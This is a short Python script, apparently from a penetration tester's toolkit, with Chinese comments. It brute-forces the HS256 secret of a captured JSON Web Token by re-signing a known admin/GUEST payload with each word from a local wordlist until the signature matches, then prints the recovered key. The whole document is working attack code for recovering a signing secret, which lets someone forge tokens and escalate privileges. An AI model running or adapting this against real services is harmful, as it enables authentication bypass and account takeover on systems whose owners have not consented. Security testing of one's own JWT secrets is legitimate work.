# coding=utf-8
# /usr/bin/python3

import time
import jwt

#header
header = {
    "typ": "JWT",
    "alg": "HS256"
	}

#payload
payload = {
	#"iat":time.time(),
	#"name":"time"
    "userName": "admin",
    "pwd": "admin",
    "userRole": "GUEST",
    "exp": 1599801549
	}

#爆破字典
file = '/Users/shadowflow/pentest/dict/fuzzDicts/userNameDict/top500.txt'

#需要匹配的JWT
inputString = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6ImFkbWluIiwicHdkIjoiYWRtaW4iLCJ1c2VyUm9sZSI6IkdVRVNUIiwiZXhwIjoxNTk5ODAxNTQ5fQ.fYQi0VL-4r2VEfE3uHEeIlPqgp1eRtOd6tW_0a1l0So"


with open(file,'r') as f:
    for line in f:
        line = line.replace('\n','')
        #print(line)
        jwt_token = jwt.encode(payload,key=line,algorithm="HS256",headers=header).decode('ascii') #输出
        if jwt_token == inputString:
            print("key is: "+line)
            break

